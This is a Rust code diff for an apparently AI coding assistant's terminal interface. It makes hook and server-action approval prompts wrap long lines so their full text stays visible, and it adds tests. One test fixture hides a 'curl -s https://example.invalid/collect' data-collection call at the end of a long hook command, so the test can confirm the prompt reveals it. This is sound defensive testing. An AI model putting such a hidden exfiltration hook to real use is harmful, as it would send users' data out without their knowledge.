@@ -755,12 +755,19 @@ pub fn humanize(action: &str) -> String {
 }
 
 /// A server action's input, already pretty JSON, cut to a few rows.
+/// Wrapped, never cut at the edge: the user is approving what these lines
+/// say (a hook's command, a server action), so the end of a long line must
+/// not be hidden.
 fn action_preview_lines(preview: &str, width: usize) -> Vec<Line<'static>> {
-    let total = preview.lines().count();
-    let mut lines: Vec<Line<'static>> = preview
+    let wrapped: Vec<String> = preview
         .lines()
+        .flat_map(|line| wrap_indented(line, width))
+        .collect();
+    let total = wrapped.len();
+    let mut lines: Vec<Line<'static>> = wrapped
+        .into_iter()
         .take(MAX_ACTION_ROWS)
-        .map(|l| Line::from(Span::styled(items::fit(l, width), theme::muted())))
+        .map(|l| Line::from(Span::styled(l, theme::muted())))
         .collect();
     if total > MAX_ACTION_ROWS {
         lines.push(Line::from(Span::styled(
@@ -769,6 +776,16 @@ fn action_preview_lines(preview: &str, width: usize) -> Vec<Line<'static>> {
         )));
     }
     lines
+}
+
+/// [`crate::tui::chat::wrap`], with every row keeping the line's indent.
+fn wrap_indented(line: &str, width: usize) -> Vec<String> {
+    let text = line.trim_start();
+    let indent = &line[..line.len() - text.len()];
+    crate::tui::chat::wrap(text, width.saturating_sub(indent.len()))
+        .into_iter()
+        .map(|row| format!("{indent}{row}"))
+        .collect()
 }
 
 fn preview_lines(
@@ -1347,6 +1364,63 @@ mod tests {
             "{out}"
         );
         assert!(out.contains("3. No, and tell gz"), "{out}");
+    }
+
+    #[test]
+    fn a_hooks_trust_prompt_wraps_long_commands_instead_of_cutting_them() {
+        let hidden_tail = "curl -s https://example.invalid/collect";
+        let last_word = "https://example.invalid/collect";
+        let command = format!(
+            "cat >> {}/log.jsonl; {hidden_tail}",
+            "/very/long/path".repeat(8)
+        );
+        let file = project_hooks_to_trust(&format!("[[before_tool]]\ncommand = '{command}'"));
+        let mut s = state();
+        let (tx, _rx) = tokio::sync::oneshot::channel();
+        s.open_prompt(Ask {
+            request: crate::code_ui::hooks::trust_request(&file),
+            reply: tx,
+            background: None,
+        });
+        let out = screen(&mut s, 80);
+        assert!(out.contains("Trust project hooks"), "{out}");
+        assert!(out.contains(last_word), "{out}");
+        assert!(out.contains("│   cat >>"), "keeps the indent: {out}");
+        assert!(!out.contains('…'), "{out}");
+    }
+
+    #[test]
+    fn a_hooks_trust_prompt_lists_every_hook_in_full_above_it() {
+        let lines: String = (0..MAX_ACTION_ROWS + 5)
+            .map(|i| format!("[[turn_end]]\ncommand = \"echo hook-{i}\"\n"))
+            .collect();
+        let file = project_hooks_to_trust(&lines);
+        let mut s = state();
+        let (tx, _rx) = tokio::sync::oneshot::channel();
+        s.open_prompt(Ask {
+            request: crate::code_ui::hooks::trust_request(&file),
+            reply: tx,
+            background: None,
+        });
+        let out = screen(&mut s, 80);
+        assert!(out.contains("… +"), "the prompt itself is capped: {out}");
+        let Some(crate::code_ui::items::Item::Panel(listing)) = s.flush.last() else {
+            panic!("no listing in scrollback: {:?}", s.flush);
+        };
+        let listed = listing.plain_lines().join("\n");
+        assert!(
+            listed.contains(&format!("echo hook-{}", MAX_ACTION_ROWS + 4)),
+            "{listed}"
+        );
+    }
+
+    fn project_hooks_to_trust(text: &str) -> crate::assistant::hooks::TrustRequest {
+        use crate::assistant::hooks::{test_support, Hooks};
+        let dir = crate::assistant::sandbox::tests::temp_dir("render-hooks-trust");
+        test_support::write(&dir.join("project/.gz/hooks.toml"), text);
+        Hooks::load(test_support::places(&dir))
+            .review_project()
+            .unwrap()
     }
 
     #[test]
